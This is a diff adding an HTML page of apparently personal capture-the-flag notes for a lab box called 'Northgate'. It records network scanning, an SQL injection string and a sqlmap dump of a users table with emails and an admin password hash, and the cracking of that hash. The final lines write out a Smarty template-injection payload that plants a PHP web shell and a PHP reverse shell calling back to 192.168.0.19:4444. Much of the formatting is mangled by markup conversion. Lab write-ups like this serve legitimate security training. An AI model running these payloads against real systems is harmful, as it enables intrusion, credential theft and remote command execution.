@@ -1,0 +1,120 @@
+<div id="content"><hr />
+
+<p>tags: [Nettitude]<br />
+title: Northgate<br />
+created: '2020-10-08T13:10:05.487Z'</p>
+
+<h2 id="modified-2020-11-10t173402153z">modified: '2020-11-10T17:34:02.153Z'</h2>
+
+<h1 id="northgate">Northgate</h1>
+
+<ul>
+<li><p>netdiscover -r 192.168.0.0/16</p></li>
+<li><p>nmap -Pn -sS -sV -p- -A 192.168.0.21</p>
+
+<ul>
+<li><p>Web server running port 8880</p></li>
+<li><p>SQL Injection?</p></li>
+</ul>
+
+<p><pre><code class="'or 1=1;#<code>lang-'or 1=1;#</code> language-'or 1=1;#```"></p>
+
+<blockquote>
+  <p>returns all users<br />
+  However, no debug statements, blind.</p>
+</blockquote>
+
+<ul>
+<li><code>sqlmap -u 'http://192.168.0.21:8880/' --forms --crawl=2 --dump</code><br />
+</code></pre>sql<br />
++--------+---------------------------------------------------------------------------------------------------+------+---------------------+<br />
+| UserId | Note                                                                                              | Id   | DateTime            |<br />
++--------+---------------------------------------------------------------------------------------------------<br />
++------+---------------------+<br />
+| 10     | Flag 1 is: flag1{2230de66aa4547d2325d8d12276f1085}                                                | 1    | 2020-08-27 14:04:34 |<br />
+| 6      | TODO: Add some security to the admin panel                                                        | 2    | 2020-05-11 15:16:33 |<br />
+| 10     | Have we been hacked again Nick?                                                                   | 3    | 2020-05-21 13:20:22 |<br />
+| 6      | Yes, I've temporarily "disabled" the Smarty template engine so we shouldn't have any more issues! | 4    | 2020-05-30 09:47:38 |<br />
++--------+---------------------------------------------------------------------------------------------------+------+---------------------+</li>
+</ul></li>
+</ul>
+
+<p>[12:35:32] [INFO] table 'Northgate.Notes' dumped to CSV file '/root/.sqlmap/output/192.168.0.21/dump/Northgate/Notes.csv'<br />
+[12:35:32] [INFO] fetching columns for table 'Users' in database 'Northgate'<br />
+[12:35:32] [INFO] fetching entries for table 'Users' in database 'Northgate'<br />
+[12:35:32] [INFO] recognized possible password hashes in column 'Pass'<br />
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n<br />
+do you want to crack them via a dictionary-based attack? [y/N/q] n<br />
+Database: Northgate<br />
+Table: Users<br />
+[10 entries]<br />
++----------------------------------+------+---------+-----------+----------+--------------------------------------+<br />
+| Pass                             | Id   | IsAdmin | Surname   | Forename | EmailAddress                         |<br />
++----------------------------------+------+---------+-----------+----------+--------------------------------------+<br />
+| <blank>                          | 1    | 0       | Watt      | Javan    | Javan.Watt@northgate.gov.local       |<br />
+| <blank>                          | 2    | 0       | Stokes    | Reece    | Reece.Stokes@northgate.gov.local     |<br />
+| <blank>                          | 3    | 0       | Hood      | Yusra    | Yusra.Hood@northgate.gov.local       |<br />
+| <blank>                          | 4    | 0       | Garrett   | Lachlan  | Lachlan.Garrett@northgate.gov.local  |<br />
+| <blank>                          | 5    | 0       | Collier   | Zofia    | Zofia.Collier@northgate.gov.local    |<br />
+| C31AC812DBB4B1A273B3C2D3BD465690 | 6    | 1       | Moon      | Nick     | Nick.Moon@northgate.gov.local        |<br />
+| <blank>                          | 7    | 0       | Stuart    | Ebony    | Ebony.Stuart@northgate.gov.local     |<br />
+| <blank>                          | 8    | 0       | Blanchard | Baxter   | Baxter.Blanchard@northgate.gov.local |<br />
+| <blank>                          | 9    | 0       | Estes     | Humayra  | Humayra.Estes@northgate.gov.local    |<br />
+| <blank>                          | 10   | 0       | Perkins   | Viola    | Viola.Perkins@northgate.gov.local    |<br />
++----------------------------------+------+---------+-----------+----------+--------------------------------------+</p>
+
+<p><pre><code class="plaintext lang-plaintext language-plaintext"></p>
+
+<ul>
+<li>Hash-Identifier</li>
+</ul>
+
+<p></code></pre>bash<br />
+root@kali:~/Documents/nettitude# hash-identifier<br />
+   #########################################################################<br />
+   #     __  __                     __           ______    _____           #<br />
+   #    /\ \/\ \                   /\ \         /__  _\  /\  _ <code>\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__</code>\   / ,__\ \ \  _ <code>\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__,</code>\ \ \ \ \ \      _\ __ \ \ _\ \      #<br />
+   #       \ _\ _\ ___ _\/____/  \ _\ _\     /_____\ \ ____/      #<br />
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #<br />
+   #                                                             By Zion3R #<br />
+   #                                                    www.Blackploit.com #<br />
+   #                                                   Root@Blackploit.com #</p>
+
+<h2 id="-1">   #########################################################################</h2>
+
+<p>HASH: C31AC812DBB4B1A273B3C2D3BD465690</p>
+
+<p>Possible Hashs:<br />
+[+] MD5<br />
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</p>
+
+<p><pre><code class="plaintext lang-plaintext language-plaintext"></p>
+
+<blockquote>
+  <p>crackstation.net or hashcat</p>
+  
+  <blockquote>
+    <p>viola is password</p>
+    
+    <blockquote>
+      <p>Nick.Moon@northgate.gov.local</p>
+    </blockquote>
+  </blockquote>
+</blockquote>
+
+<ul>
+<li><p>Log into admin page</p></li>
+<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li>
+<li>XSS Vulnerability?<br />
+&gt; Nope, Template Injection<br />
+&gt;&gt; Smarty</li>
+<li>syntax {5*5}</li>
+<li>RCE to shell?<br />
+</code></pre>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}<pre><code class="plaintext lang-plaintext language-plaintext"><br />
+or is it php reverse shell<br />
+</code></pre>$sock=fsockopen("192.168.0.19",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2>&amp;3");```</li>
+</ul>
+</div>
